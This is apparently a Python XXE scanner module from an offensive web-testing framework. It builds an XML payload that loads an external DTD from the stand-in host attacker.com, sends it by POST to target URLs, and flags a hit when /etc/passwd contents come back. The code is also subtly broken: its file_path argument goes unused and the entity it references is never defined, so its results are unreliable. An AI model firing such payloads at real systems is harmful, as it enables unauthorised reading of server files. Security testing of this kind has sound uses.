# modules/xxe.py
from core.colors import Colors

class NPXXMLEngine:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.findings = []

    def generate_xxe_payload(self, file_path="/etc/passwd"):
        """توليد بايلود XXE لقراءة الملفات"""
        return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
%remote;
]>
<root>&data;</root>"""

    def test_xxe(self, url):
        """إرسال طلب POST يحمل XML خبيث"""
        print(f"{Colors.DIM}[*] Testing XXE on {url}{Colors.ENDC}")
        payload = self.generate_xxe_payload()
        try:
            headers = {'Content-Type': 'application/xml'}
            response = self.session.send_request("POST", url, data=payload, headers=headers)
            if response:
                content = response.text
                if "root:x:0:0" in content:
                    self.findings.append({
                        'type': 'XXE',
                        'url': url,
                        'details': 'Blind XXE / File read via /etc/passwd'
                    })
                    print(f"{Colors.FAIL}[!] XXE Found! Able to read /etc/passwd.{Colors.ENDC}")
                elif "<?xml" in content and "DOCTYPE" in content:
                    self.findings.append({
                        'type': 'XXE',
                        'url': url,
                        'details': 'XXE potential (XML parsing detected)'
                    })
                    print(f"{Colors.WARNING}[!] XXE Potential at {url}{Colors.ENDC}")
        except Exception as e:
            pass

    def run(self, target_urls):
        print(f"{Colors.OKCYAN}[*] Module: XXE Scanner...{Colors.ENDC}")
        xml_endpoints = [u for u in target_urls if any(x in u for x in ['xml', 'api', 'soap', 'wsdl'])]
        if not xml_endpoints:
            xml_endpoints = target_urls[:5]  # جرب أول 5 روابط
        for url in xml_endpoints:
            self.test_xxe(url)
        return self.findings
